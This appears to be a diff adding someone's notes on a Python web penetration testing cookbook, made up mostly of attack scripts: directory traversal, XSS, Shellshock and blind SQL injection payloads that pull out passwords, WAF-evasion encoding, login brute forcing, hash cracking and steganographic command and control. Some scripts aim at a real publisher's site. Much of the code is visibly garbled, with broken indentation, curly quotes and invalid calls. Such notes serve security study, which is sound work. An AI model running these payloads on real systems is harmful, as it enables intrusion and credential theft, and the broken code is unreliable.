@@ -1,0 +1,1136 @@
+Python web penetration testing cookbook=Andrew Mabbitt;Note=Erxin
+
+# Gathering open source intelligence 
+- Open Source Intelligence (OSINT) is the process of gathering information from Open (overt) sources
+
+Whilst this database is searchable from the Shodan website (https://www.shodan.io), the results and services reported on are limited
+
+- gathering inforamtion using the Shodan API
+
+```
+import shodan
+import requests
+
+SHODAN_API_KEY = "{Insert your Shodan API key}" 
+api = shodan.Shodan(SHODAN_API_KEY)
+
+target = 'www.packtpub.com'
+
+dnsResolve = 'https://api.shodan.io/dns/resolve?hostnames=' + target + '&key=' + SHODAN_API_KEY
+
+try:
+    # First we need to resolve our targets domain to an IP
+    resolved = requests.get(dnsResolve)
+    hostIP = resolved.json()[target]
+
+    # Then we need to do a Shodan search on that IP
+    host = api.host(hostIP)
+    print "IP: %s" % host['ip_str']
+    print "Organization: %s" % host.get('org', 'n/a')
+    print "Operating System: %s" % host.get('os', 'n/a')
+
+    # Print all banners
+    for item in host['data']:
+        print "Port: %s" % item['port']
+        print "Banner: %s" % item['data']
+
+    # Print vuln information
+    for item in host['vulns']:
+        CVE = item.replace('!','')
+        print 'Vulns: %s' % item
+        exploits = api.exploits.search(CVE)
+        for item in exploits['matches']:
+            if item.get('cve')[0] == CVE:
+                print item.get('description')
+except:
+    'An error occured'
+```
+
+- scripting a google+ API search 
+
+```
+import urllib2
+
+GOOGLE_API_KEY = "{Insert your Google API key}" 
+target = "packtpub.com"
+api_response = urllib2.urlopen("https://www.googleapis.com/plus/v1/people? query="+target+"&key="+GOOGLE_API_KEY).read()
+api_response = api_response.split("\n")
+for line in api_response:
+    if "displayName" in line:
+        print line
+```
+
+- downloading picture from google+ API 
+
+```
+import urllib2
+import json
+
+GOOGLE_API_KEY = "{Insert your Google API key}"
+target = "packtpub.com"
+api_response = urllib2.urlopen("https://www.googleapis.com/plus/v1/people? query="+target+"&key="+GOOGLE_API_KEY).read()
+
+json_response = json.loads(api_response)
+for result in json_response['items']:
+      name = result['displayName']
+      print name
+      image = result['image']['url'].split('?')[0]
+  f = open(name+'.jpg','wb+')
+  f.write(urllib2.urlopen(image).read())
+  f.close()
+```
+
+- getting screenshots with QtWebKit 
+
+```
+import sys
+import time
+from PyQt4.QtCore import *
+from PyQt4.QtGui import *
+from PyQt4.QtWebKit import *
+
+class Screenshot(QWebView):
+    def __init__(self):
+        self.app = QApplication(sys.argv)
+        QWebView.__init__(self)
+        self._loaded = False
+        self.loadFinished.connect(self._loadFinished)
+
+    def wait_load(self, delay=0):
+        while not self._loaded:
+            self.app.processEvents()
+            time.sleep(delay)
+        self._loaded = False
+
+    def _loadFinished(self, result):
+        self._loaded = True
+
+    def get_image(self, url):
+        self.load(QUrl(url))
+        self.wait_load()
+
+        frame = self.page().mainFrame()
+        self.page().setViewportSize(frame.contentsSize())
+
+        image = QImage(self.page().viewportSize(), QImage.Format_ARGB32)
+        painter = QPainter(image)
+        frame.render(painter)
+        painter.end()
+        return image
+```
+
+- spidering websites with beautifulsoup 
+
+```
+import urllib2 
+from bs4 import BeautifulSoup
+import sys
+urls = []
+urls2 = []
+
+tarurl = sys.argv[1] 
+
+url = urllib2.urlopen(tarurl).read()
+soup = BeautifulSoup(url)
+for line in soup.find_all('a'):
+    newline = line.get('href')
+    try: 
+        if newline[:4] == "http": 
+            if tarurl in newline: 
+            urls.append(str(newline)) 
+        elif newline[:1] == "/": 
+            combline = tarurl+newline urls.append(str(combline)) except: 
+               pass
+
+    for uurl in urls: 
+        url = urllib2.urlopen(uurl).read() 
+        soup = BeautifulSoup(url) 
+        for line in soup.find_all('a'): 
+            newline = line.get('href') 
+            try: 
+                if newline[:4] == "http": 
+                    if tarurl in newline:
+                        urls2.append(str(newline)) 
+                elif newline[:1] == "/": 
+                    combline = tarurl+newline 
+                    urls2.append(str(combline)) 
+                    except: 
+                pass 
+            urls3 = set(urls2) 
+    for value in urls3: 
+    print value
+```
+
+
+# Enumeration 
+- ping sweep with scapy 
+
+```
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+import sys 
+from scapy.all import *
+
+if len(sys.argv) !=3:
+    print "usage: %s start_ip_addr end_ip_addr" % (sys.argv[0])
+    sys.exit(0)
+
+livehosts=[]
+#IP address validation
+ipregex=re.compile("^([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0- 9]|25[0-5])\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0- 5])\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.([0- 9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$")
+
+if (ipregex.match(sys.argv[1]) is None):
+  print "Starting IP address is invalid"
+  sys.exit(0)
+if (ipregex.match(sys.argv[1]) is None):
+  print "End IP address is invalid"
+  sys.exit(0)
+
+iplist1 = sys.argv[1].split(".")
+iplist2 = sys.argv[2].split(".")
+
+if not (iplist1[0]==iplist2[0] and iplist1[1]==iplist2[1] and iplist1[2]==iplist2[2])
+  print "IP addresses are not in the same class C subnet"
+  sys.exit(0)	
+
+if iplist1[3]>iplist2[3]:
+  print "Starting IP address is greater than ending IP address"
+  sys.exit(0)
+
+networkaddr = iplist1[0]+"."+iplist1[1]+"."+iplist[2]+"."
+
+start_ip_last_octet = int(iplist1[3])
+end_ip_last_octet = int(iplist2[3])
+
+if iplist1[3]<iplist2[3]:
+  print "Pinging range "+networkaddr+str(start_ip_last_octet)+"- "+str(end_ip_last_octet)
+else
+  print "Pinging "+networkaddr+str(startiplastoctect)+"\n"
+
+for x in range(start_ip_last_octet, end_ip_last_octet+1)
+  packet=IP(dst=networkaddr+str(x))/ICMP()
+  response = sr1(packet,timeout=2,verbose=0)
+  if not (response is None):
+    if  response[ICMP].type==0:
+      livehosts.append(networkaddr+str(x))
+
+print "Scan complete!\n"
+if len(livehosts)>0:
+  print "Hosts found:\n"
+  for host in livehosts:
+    print host+"\n"
+else:
+  print "No live hosts found\n"
+```
+
+- finding email from webpage 
+
+There are two ways this can be manipulated: firstly, by providing an absolute link such as /etc/passwd, which states from the root directory browse to the etc directory and open the passwd file, and secondly, relative links that travel up directories in order to reach the root directory
+
+```
+import urllib2
+import re
+import time
+from random import randint
+regex = re.compile(("([a-z0-9!#$%&'*+\/=?^_'{|}~-]+(?:\.[a-z0- 9!#$%&'*+\/=?^_'"
+                    "{|}~-]+)*(@|\sat\s)(?:[a-z0-9](?:[a-z0-9- ]*[a-z0-9])?(\.|"
+                    "\sdot\s))+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)"))
+
+tarurl = open("urls.txt", "r")
+for line in tarurl:
+  output = open("emails.txt", "a")
+  time.sleep(randint(10, 100))
+  try: 
+    url = urllib2.urlopen(line).read()
+    output.write(line)
+    emails = re.findall(regex, url)
+    for email in emails:
+      output.write(email[0]+"\r\n")
+      print email[0]
+  except:
+    pass
+    print "error"
+  output.close()
+```
+
+- automated URL-based directory traversal 
+
+```
+import requests
+import sys
+url = sys.argv[1]
+payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'}
+up = "../"
+i = 0
+for payload, string in payloads.iteritems():
+  for i in xrange(7):
+    req = requests.post(url+(i*up)+payload)
+    if string in req.text:
+      print "Parameter vulnerable\r\n"
+      print "Attack string: "+(i*up)+payload+"\r\n"
+      print req.text
+      break
+```
+
+- automated URL based cross-site scripting 
+
+```
+import requests
+import sys
+url = sys.argv[1]
+payloads = ['<script>alert(1);</script>', '<BODY ONLOAD=alert(1)>']
+for payload in payloads:
+  req = requests.post(url+payload)
+  if payload in req.text:
+    print "Parameter vulnerable\r\n"
+    print "Attack string: "+payload
+    print req.text
+    break
+```
+
+- automated parameter based scross-site scripting 
+
+```
+import requests
+import sys
+from bs4 import BeautifulSoup, SoupStrainer
+url = "http://127.0.0.1/xss/medium/guestbook2.php"
+url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
+url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"
+payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
+initial = requests.get(url)
+for payload in payloads:
+  d = {}
+  for field in BeautifulSoup(initial.text, parse_only=SoupStrainer('input')):
+          if field.has_attr('name'):
+            if field['name'].lower() == "submit":
+              d[field['name']] = "submit"
+            else:
+              d[field['name']] = payload
+  req = requests.post(url2, data=d)
+  checkresult = requests.get(url3)
+
+  if payload in checkresult.text:
+    print "Full string returned"
+    print "Attack string: "+ payload
+```
+
+- automated fuzzing, reprobates version of SQL Injection and arguably the base form of penetration testin
+
+```
+import requests
+import sys
+from bs4 import BeautifulSoup, SoupStrainer
+url = "http://127.0.0.1/xss/medium/guestbook2.php"
+url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
+url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"
+
+f =  open("/home/cam/Downloads/fuzzdb-1.09/attack-payloads/all- attacks/interesting-metacharacters.txt")
+o = open("results.txt", 'a')
+
+print "Fuzzing begins!"
+
+initial = requests.get(url)
+for payload in f.readlines():
+  for field in BeautifulSoup(initial.text,  parse_only=SoupStrainer('input')):
+  d = {}
+
+          if field.has_attr('name'):
+            if field['name'].lower() == "submit":
+             d[field['name']] = "submit"
+            else:
+             d[field['name']] = payload
+  req = requests.post(url2, data=d)
+  response = requests.get(url3)
+
+  o.write("Payload: "+ payload +"\r\n")
+  o.write(response.text+"\r\n")
+
+
+print "Fuzzing has ended"
+```
+
+- jquery checking 
+
+```
+import requests
+import re
+from bs4 import BeautifulSoup
+import sys
+
+scripts = []
+
+if len(sys.argv) != 2:
+  print "usage: %s url" % (sys.argv[0])
+  sys.exit(0)
+
+tarurl = sys.argv[1]
+url = requests.get(tarurl)
+soup = BeautifulSoup(url.text)
+for line in soup.find_all('script'):
+  newline = line.get('src')
+  scripts.append(newline)
+
+for script in scripts:
+  if "jquery.min" in str(script).lower():
+    url = requests.get(script)
+    versions = re.findall(r'\d[0-9a-zA-Z._:-]+',url.text)
+    if versions[0] == "2.1.1" or versions[0] == "1.12.1":
+      print "Up to date"
+    else:
+      print "Out of date"
+      print "Version detected: "+versions[0]
+```
+
+- header based cross-site scripting 
+
+```
+import requests
+import sys
+url = sys.argv[1]
+payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY  ONLOAD=alert(1)>']
+headers ={}
+r = requests.head(url)
+for payload in payloads:
+  for header in r.headers:
+    headers[header] = payload
+  req = requests.post(url, headers=headers)
+```
+
+- shellshock checking 
+
+```
+import requests
+import sys
+url = sys.argv[1]
+payload = "() { :; }; /bin/bash -c 'ping –c 1 –p pwnt <url/ip>'"
+headers ={}
+r = requests.head(url)
+for header in r.headers:
+  if header == "referer" or header == "User-Agent": 
+    headers[header] = payload
+req = requests.post(url, headers=headers)
+```
+
+Submitted <script>alert(1);</script>
+
+
+# SQL injection 
+- checking jitter 
+
+```
+import requests
+import sys
+url = sys.argv[1]
+
+values = []
+
+for i in xrange(100): 
+  r = requests.get(url)
+  values.append(int(r.elapsed.total_seconds()))
+
+average = sum(values) / float(len(values))
+print “Average response time for “+url+” is “+str(average).
+```
+
+- identifying URL based SQLi
+
+```
+import requests
+
+url = “http://127.0.0.1/SQL/sqli-labs-master/Less-1/index.php?id=”
+initial = “'”
+print “Testing “+ url
+first = requests.post(url+initial)
+
+if “mysql” in first.text.lower(): 
+  print “Injectable MySQL detected”
+elif “native client” in first.text.lower():
+  print “Injectable MSSQL detected”
+elif “syntax error” in first.text.lower():
+  print “Injectable PostGRES detected”
+elif “ORA” in first.text.lower():
+  print “Injectable Oracle detected”
+else:
+  print “Not Injectable J J”
+```
+
+- exploiting boolean SQLi 
+
+```
+import requests
+import sys
+
+yes = sys.argv[1]
+
+i = 1
+asciivalue = 1
+
+answer = []
+print “Kicking off the attempt”
+
+payload = {'injection': '\'AND char_length(password) = '+str(i)+';#', 'Submit': 'submit'}
+
+while True:
+  req = requests.post('<target url>' data=payload)
+  lengthtest = req.text
+  if yes in lengthtest:
+    length = i
+    break
+  else:
+    i = i+1
+
+for x in range(1, length):
+  while asciivalue < 126:
+payload = {'injection': '\'AND (substr(password, '+str(x)+', 1)) = '+ chr(asciivalue)+';#', 'Submit': 'submit'}
+      req = requests.post('<target url>', data=payload)
+      if yes in req.text:
+    answer.append(chr(asciivalue))
+break
+  else:
+      asciivalue = asciivalue + 1
+      pass
+asciivalue = 0
+print “Recovered String: “+ ''.join(answer)
+```
+
+- exploiting blind sql injection 
+
+```
+import requests
+
+times = []
+print “Kicking off the attempt”
+cookies = {'cookie name': 'Cookie value'}
+
+payload = {'injection': '\'or sleep char_length(password);#', 'Submit': 'submit'}
+req = requests.post('<target url>' data=payload, cookies=cookies)
+firstresponsetime = str(req.elapsed.total_seconds)
+
+for x in range(1, firstresponsetime):
+  payload = {'injection': '\'or sleep(ord(substr(password, '+str(x)+', 1)));#', 'Submit': 'submit'}
+  req = requests.post('<target url>', data=payload, cookies=cookies)
+  responsetime = req.elapsed.total_seconds
+  a = chr(responsetime)
+    times.append(a)
+    answer = ''.join(times)
+print “Recovered String: “+ answer
+```
+
+- encoding payloads 
+
+```
+subs = []
+values = {“ “: “%50”, “SELECT”: “HAVING”, “AND”: “&&”, “OR”: “||”}
+originalstring = “' UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin';#”
+secondoriginalstring = originalstring
+for key, value in values.iteritems():
+  if key in originalstring:
+    newstring = originalstring.replace(key, value)
+    subs.append(newstring)
+  if key in secondoriginalstring:
+    secondoriginalstring = secondoriginalstring.replace(key, value)
+    subs.append(secondoriginalstring)
+
+subset = set(subs)
+for line in subs:
+  print line
+```
+
+
+# Web header manipulation 
+- testing HTTP methods 
+
+```
+import requests
+
+verbs = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'TEST']
+for verb in verbs:
+    req = requests.request(verb, 'http://packtpub.com')
+    print verb, req.status_code, req.reason
+    if verb == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
+      print 'Possible Cross Site Tracing vulnerability found'
+```
+
+- fingerprinting servers through HTTP headers, parse the response headers in an attempt 
+
+```
+import requests
+
+req = requests.get('http://packtpub.com')
+headers = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Country-Code']
+
+for header in headers:
+    try:
+  result = req.headers[header]
+        print '%s: %s' % (header, result)
+    except Exception, error:
+        print '%s: Not found' % header
+```
+
+The Date header contains useful information that can be used to guess where the server is located.
+
+The Via header is used by proxies, both outgoing and incoming, and will display the proxy name
+
+The X-Powered-By is a standard header used in common web frameworks such as PHP
+
+The final line prints the X-Country-Code short code, another useful piece of information to identify where the server is located
+
+- test in secure headers 
+
+```
+import requests
+
+urls = open("urls.txt", "r")
+for url in urls:
+  url = url.strip()
+  req = requests.get(url)
+  print url, 'report:'
+
+  try:
+    xssprotect = req.headers['X-XSS-Protection']
+    if  xssprotect != '1; mode=block':
+      print 'X-XSS-Protection not set properly, XSS may be possible:', xssprotect
+  except:
+    print 'X-XSS-Protection not set, XSS may be possible'
+
+  try:
+    contenttype = req.headers['X-Content-Type-Options']
+    if contenttype != 'nosniff':
+      print 'X-Content-Type-Options not set properly:',  contenttype
+  except:
+    print 'X-Content-Type-Options not set'
+
+  try:
+    hsts = req.headers['Strict-Transport-Security']
+  except:
+    print 'HSTS header not set, MITM attacks may be possible'
+
+  try:
+    csp = req.headers['Content-Security-Policy']
+    print 'Content-Security-Policy set:', csp
+  except:
+    print 'Content-Security-Policy missing'
+
+  print '----'
+```
+
+- brute forcing login throught the authorization 
+
+```
+import requests
+from requests.auth import HTTPBasicAuth
+
+with open('passwords.txt') as passwords:
+    for password in passwords.readlines():
+        password = password.strip()
+        req = requests.get('http://packtpub.com/admin_login.html', auth=HTTPBasicAuth('admin', password))
+        if req.status_code == 401:
+            print password, 'failed.'
+        elif req.status_code == 200:
+            print 'Login successful, password:', password
+            break
+        else:
+            print 'Error occurred with', password
+            break
+```
+
+- testing for clickjacking vulnerabilities,  either by setting an X-FRAME-OPTIONS header, which tells the browser not to render the site if it's inside a frame
+
+using javascript escape out of frames 
+
+```
+import requests
+from ghost import Ghost
+import logging
+import os
+
+URL = 'http://packtpub.com'
+req = requests.get(URL)
+
+try:
+    xframe = req.headers['x-frame-options']
+    print 'X-FRAME-OPTIONS:', xframe , 'present, clickjacking not likely possible'
+except:
+    print 'X-FRAME-OPTIONS missing'
+
+print 'Attempting clickjacking...'
+
+html = '''
+<html>
+<body>
+<iframe src="'''+URL+'''" height='600px' width='800px'></iframe>
+</body>
+</html>'''
+  
+html_filename = 'clickjack.html'
+f = open(html_filename, 'w+')
+f.write(html)
+f.close()
+
+log_filename = 'test.log'
+fh = logging.FileHandler(log_filename)
+ghost = Ghost(log_level=logging.INFO, log_handler=fh)
+page, resources = ghost.open(html_filename)
+  
+l = open(log_filename, 'r')
+if 'forbidden by X-Frame-Options.' in l.read():
+    print 'Clickjacking mitigated via X-FRAME-OPTIONS'
+else:
+    href = ghost.evaluate('document.location.href')[0]
+    if html_filename not in href:
+        print 'Frame busting detected'
+    else:
+        print 'Frame busting not detected, page is likely vulnerable to clickjacking'
+l.close()
+
+logging.getLogger('ghost').handlers[0].close()
+os.unlink(log_filename)
+os.unlink(html_filename)
+```
+
+- identifying alternative sites by spoofing user agents, old and vulnerable version of Internet Explorer. This can be a good place to find vulnerabilities because these might have been tested less rigorously
+
+```
+import requests
+import hashlib
+
+user_agents = { 'Chrome on Windows 8.1' : 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
+'Safari on iOS' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4',
+'IE6 on Windows XP' : 'Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
+'Googlebot' : 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' }
+
+responses = {}
+for name, agent in user_agents.items():
+  headers = {'User-Agent' : agent}
+  req = requests.get('http://packtpub.com', headers=headers)
+  responses[name] = req
+
+md5s = {}
+for name, response in responses.items():
+  md5s[name] = hashlib.md5(response.text.encode('utf- 8')).hexdigest()
+
+for name,md5 in md5s.iteritems():
+    if name != 'Chrome on Windows 8.1':
+        if md5 != md5s['Chrome on Windows 8.1']:
+            print name, 'differs from baseline'
+        else:
+            print 'No alternative site found via User-Agent spoofing:', md5
+```
+
+- testing for insecure cookie flags, Cookies are set from the web server in the HTTP response using a Set-Cookie header. They are then sent back to the server through the Cookie header. 
+
+```
+import requests
+
+req = requests.get('http://www.packtpub.com')
+for cookie in req.cookies:
+  print 'Name:', cookie.name
+  print 'Value:', cookie.value
+
+  if not cookie.secure:
+    cookie.secure = '\x1b[31mFalse\x1b[39;49m'
+  print 'Secure:', cookie.secure
+
+  if 'httponly' in cookie._rest.keys():
+    cookie.httponly = 'True'
+  else:
+    cookie.httponly = '\x1b[31mFalse\x1b[39;49m'
+  print 'HTTPOnly:', cookie.httponly
+
+  if cookie.domain_initial_dot:
+    cookie.domain_initial_dot = '\x1b[31mTrue\x1b[39;49m'
+  print 'Loosly defined domain:', cookie.domain_initial_dot, '\n'
+```
+
+- session fixation through a cookie injection 
+
+```
+import requests
+
+url = 'http://www.packtpub.com/'
+req = requests.get(url)
+if req.cookies:
+  print 'Initial cookie state:', req.cookies
+  cookie_req = requests.post(url, cookies=req.cookies, auth=('user1', 'supersecretpasswordhere'))
+  print 'Authenticated cookie state:', cookie_req.cookies
+
+  if req.cookies == cookie_req.cookies:
+      print 'Session fixation vulnerability identified'
+```
+
+- image analysis and manipulation, Hiding a message by using LSB steganography, hiding text, extract text, command and control by using steganography 
+
+Python Image Library (PIL). To install the Python image libraries by using PIP on Linux
+
+```
+  #!/usr/bin/env python
+
+from PIL import Image
+
+def Hide_message(carrier, message, outfile):
+    c_image = Image.open(carrier)
+    hide = Image.open(message)
+    hide = hide.resize(c_image.size)
+    hide = hide.convert('1')
+    out = Image.new('RGB', c_image.size)
+
+    width, height = c_image.size
+
+    new_array = []
+
+    for h in range(height):
+        for w in range(width):
+            ip = c_image.getpixel((w,h))
+            hp = hide.getpixel((w,h))
+            if hp == 0: 
+                newred = ip[0] & 254
+            else: 
+                newred = ip[0] | 1
+
+            new_array.append((newred, ip[1], ip[2]))
+
+    out.putdata(new_array)
+    out.save(outfile)
+    print "Steg image saved to " + outfile
+
+Hide_message('carrier.png', 'message.png', 'outfile.png')
+```
+
+extract 
+```
+#!/usr/bin/env python
+
+from PIL import Image
+
+def ExtractMessage(carrier, outfile):
+    c_image = Image.open(carrier)
+    out = Image.new('L', c_image.size)
+    width, height = c_image.size
+    new_array = []
+
+    for h in range(height):
+        for w in range(width):
+            ip = c_image.getpixel((w,h))
+            if ip[0] & 1 == 0:
+                new_array.append(0)
+            else:
+                new_array.append(255)
+
+    out.putdata(new_array)
+    out.save(outfile)
+    print "Message extracted and saved to " + outfile
+
+ExtractMessage('StegTest.png', 'extracted.png')
+```
+
+
+# Encryption and encoding 
+- using hashlib 
+
+```
+import hashlib
+message = raw_input("Enter the string you would like to hash: ")
+md5 = hashlib.md5(message.encode())
+print (md5.hexdigest())
+```
+
+```
+import hashlib
+message = raw_input("Enter the string you would like to hash: ")
+sha = hashlib.sha1(message)
+sha1 = sha.hexdigest()
+print sha1
+```
+
+```
+import hashlib
+message = raw_input("Enter the string you would like to hash: ")
+sha = hashlib.sha128(message)
+sha128 = sha.hexdigest()
+print sha128
+```
+
+```
+import hashlib
+message = raw_input("Enter the string you would like to hash: ")
+sha = hashlib.sha256(message)
+sha256 = sha.hexdigest()
+print sha256
+```
+
+- secure hash functions, . Bcrypt hashes were designed to be slow when encrypting and decrypting hashes. This design was used to prevent hashes from being easily cracked if hashes got leaked to the public
+
+using the bcrypt module within Python.
+
+```
+import bcrypt
+# Let's first enter a password
+new = raw_input('Please enter a password: ')
+# We'll encrypt the password with bcrypt with the default salt value of 12
+hashed = bcrypt.hashpw(new, bcrypt.gensalt())
+# We'll print the hash we just generated
+print('The string about to be stored is: ' + hashed)
+# Confirm we entered the correct password
+plaintext = raw_input('Please re-enter the password to check: ')
+# Check if both passwords match
+if bcrypt.hashpw(plaintext, hashed) == hashed:
+    print 'It\'s a match!'
+else:
+    print 'Please try again.'
+```
+
+- cracking an MD5 hash with dictionary 
+ 
+```
+import hashlib
+target = raw_input("Please enter your hash here: ")
+dictionary = raw_input("Please enter the file name of your dictionary: ")
+def main():
+    with open(dictionary) as fileobj:
+        for line in fileobj:
+            line = line.strip()
+            if hashlib.md5(line).hexdigest() == target:
+                print "Hash was successfully cracked %s: The value is %s" % (target, line)
+                return ""
+    print "Failed to crack the file."
+if __name__ == "__main__":
+    main()
+``` 
+
+- base64 encoding 
+
+```
+#!/usr/bin/python
+msg = raw_input('Please enter the string to encode: ')
+print "Your B64 encoded string is: " + msg.encode('base64')
+```
+
+- encoding with ROT13, ROT13 was used many years ago to hide offensive jokes on forums as a kind of Not Safe For Work (NSFW) 
+
+```
+from string import maketrans, lowercase, uppercase
+def rot13(message):
+   lower = maketrans(lowercase, lowercase[13:] + lowercase[:13])
+   upper = maketrans(uppercase, uppercase[13:] + uppercase[:13])
+   return message.translate(lower).translate(upper)
+message = raw_input('Enter :')
+print rot13(message)
+```
+
+- predicting a linear congruential generator 
+
+LCGs are used in web applications to create quick and easy pseudo-random numbers. They are by nature broken and can be easily made to be predictable with enough data. 
+
+X_n+1 = (a X_n + c) mod m 
+
+```
+C = ""
+A = ""
+M = ""
+
+print "Starting attempt to brute"
+
+for i in range(1, 99999999):
+    a = str((A * int(str(i)+'00') + C) % 2**M)
+    if a[-2:] == "47":
+        b = str((A * int(a) + C) % 2**M)
+        if b[-2:] == "46":
+            c = str((A * int(b) + C) % 2**M)
+            if c[-2:] == "57":
+                d = str((A * int(c) + C) % 2**M)
+                if d[-2:] == "56":
+                    e = str((A * int(d) + C) % 2**M)
+                    if e[-2:] == "07":
+                        f = str((A * int(e) + C) % 2**M)
+                        if f[-2:] == "38":
+                            g = str((A * int(f) + C) % 2**M)
+                            if g[-2:] == "81":
+                                h = str((A * int(g) + C) % 2**M)
+                                if h[-2:] == "32":
+                                    j = str((A * int(h) + C) % 2**M)
+                                    if j[-2:] == "19":
+                                        k = str((A * int(j) + C) % 2**M)
+                                        if k[-2:] == "70":
+                                            l = str((A * int(k) + C) % 2**M)
+                                            if l[-2:] == "53":
+                                                print "potential number found: "+l
+print "next 9 values are:"
+for i in range(1, 10):
+    l = str((A * int(l) + C) % 2**M)
+    print l[-2:]
+```
+
+- identifying hashes types 
+
+```
+import re
+def hashcheck (hashtype, regexstr, data):
+    try:
+        valid_hash = re.finditer(regexstr, data)
+        result = [match.group(0) for match in valid_hash]
+        if result: 
+            return "This hash matches the format of: " + hashtype
+    except: pass
+string_to_check = raw_input('Please enter the hash you wish to check: ')
+hashes = (
+("Blowfish(Eggdrop)", r"^\+[a-zA-Z0-9\/\.]{12}$"),
+("Blowfish(OpenBSD)", r"^\$2a\$[0-9]{0,2}?\$[a-zA-Z0- 9\/\.]{53}$"),
+("Blowfish crypt", r"^\$2[axy]{0,1}\$[a-zA-Z0-9./]{8}\$[a-zA-Z0- 9./]{1,}$"),
+("DES(Unix)", r"^.{0,2}[a-zA-Z0-9\/\.]{11}$"),
+("MD5(Unix)", r"^\$1\$.{0,8}\$[a-zA-Z0-9\/\.]{22}$"),
+("MD5(APR)", r"^\$apr1\$.{0,8}\$[a-zA-Z0-9\/\.]{22}$"),
+("MD5(MyBB)", r"^[a-fA-F0-9]{32}:[a-z0-9]{8}$"),
+("MD5(ZipMonster)", r"^[a-fA-F0-9]{32}$"),
+("MD5 crypt", r"^\$1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
+("MD5 apache crypt", r"^\$apr1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0- 9./]{1,}$"),
+("MD5(Joomla)", r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{16,32}$"),
+("MD5(Wordpress)", r"^\$P\$[a-zA-Z0-9\/\.]{31}$"),
+("MD5(phpBB3)", r"^\$H\$[a-zA-Z0-9\/\.]{31}$"),
+("MD5(Cisco PIX)", r"^[a-zA-Z0-9\/\.]{16}$"),
+("MD5(osCommerce)", r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{2}$"),
+("MD5(Palshop)", r"^[a-fA-F0-9]{51}$"),
+("MD5(IP.Board)", r"^[a-fA-F0-9]{32}:.{5}$"),
+("MD5(Chap)", r"^[a-fA-F0-9]{32}:[0-9]{32}:[a-fA-F0-9]{2}$"),
+("Juniper Netscreen/SSG (ScreenOS)", r"^[a-zA-Z0-9]{30}:[a-zA-Z0- 9]{4,}$"),
+("Fortigate (FortiOS)", r"^[a-fA-F0-9]{47}$"),
+("Minecraft(Authme)", r"^\$sha\$[a-zA-Z0-9]{0,16}\$[a-fA-F0- 9]{64}$"),
+("Lotus Domino", r"^\(?[a-zA-Z0-9\+\/]{20}\)?$"),
+("Lineage II C4", r"^0x[a-fA-F0-9]{32}$"),
+("CRC-96(ZIP)", r"^[a-fA-F0-9]{24}$"),
+("NT crypt", r"^\$3\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
+("Skein-1024", r"^[a-fA-F0-9]{256}$"),
+("RIPEMD-320", r"^[A-Fa-f0-9]{80}$"),
+("EPi hash", r"^0x[A-F0-9]{60}$"),
+("EPiServer 6.x < v4", r"^\$episerver\$\*0\*[a-zA-Z0-9]{22}==\*[a- zA-Z0-9\+]{27}$"),
+("EPiServer 6.x >= v4", r"^\$episerver\$\*1\*[a-zA-Z0- 9]{22}==\*[a-zA-Z0-9]{43}$"),
+("Cisco IOS SHA256", r"^[a-zA-Z0-9]{43}$"),
+("SHA-1(Django)", r"^sha1\$.{0,32}\$[a-fA-F0-9]{40}$"),
+("SHA-1 crypt", r"^\$4\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
+("SHA-1(Hex)", r"^[a-fA-F0-9]{40}$"),
+("SHA-1(LDAP) Base64", r"^\{SHA\}[a-zA-Z0-9+/]{27}=$"),
+("SHA-1(LDAP) Base64 + salt", r"^\{SSHA\}[a-zA-Z0- 9+/]{28,}[=]{0,3}$"),
+("SHA-512(Drupal)", r"^\$S\$[a-zA-Z0-9\/\.]{52}$"),
+("SHA-512 crypt", r"^\$6\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
+("SHA-256(Django)", r"^sha256\$.{0,32}\$[a-fA-F0-9]{64}$"),
+("SHA-256 crypt", r"^\$5\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
+("SHA-384(Django)", r"^sha384\$.{0,32}\$[a-fA-F0-9]{96}$"),
+("SHA-256(Unix)", r"^\$5\$.{0,22}\$[a-zA-Z0-9\/\.]{43,69}$"),
+("SHA-512(Unix)", r"^\$6\$.{0,22}\$[a-zA-Z0-9\/\.]{86}$"),
+("SHA-384", r"^[a-fA-F0-9]{96}$"),
+("SHA-512", r"^[a-fA-F0-9]{128}$"),
+("SSHA-1", r"^({SSHA})?[a-zA-Z0-9\+\/]{32,38}?(==)?$"),
+("SSHA-1(Base64)", r"^\{SSHA\}[a-zA-Z0-9]{32,38}?(==)?$"),
+("SSHA-512(Base64)", r"^\{SSHA512\}[a-zA-Z0-9+]{96}$"),
+("Oracle 11g", r"^S:[A-Z0-9]{60}$"),
